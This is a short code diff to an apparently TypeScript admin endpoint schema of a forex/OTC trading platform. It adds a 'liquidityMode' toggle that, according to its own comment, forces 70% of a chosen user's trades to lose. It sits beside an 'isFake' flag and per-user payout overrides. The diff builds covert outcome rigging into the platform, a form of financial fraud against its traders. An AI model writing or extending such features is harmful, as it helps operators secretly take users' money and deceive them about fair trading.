@@ -31,6 +31,9 @@ const updateBodySchema = z.object({
   // Admin toggles
   isFake:                z.boolean().optional(),
   copyTraderEnabled:     z.boolean().optional(),
+  // "Liquidez" — when true, 70% of this user's ops are forced LOSS.
+  // See operations/worker.ts. Strictly per-user, opt-in only.
+  liquidityMode:         z.boolean().optional(),
   // Per-user payout overrides
   payoutOverrideForex:   z.number().int().min(0).max(100).optional().nullable(),
   payoutOverrideOtc:     z.number().int().min(0).max(100).optional().nullable(),
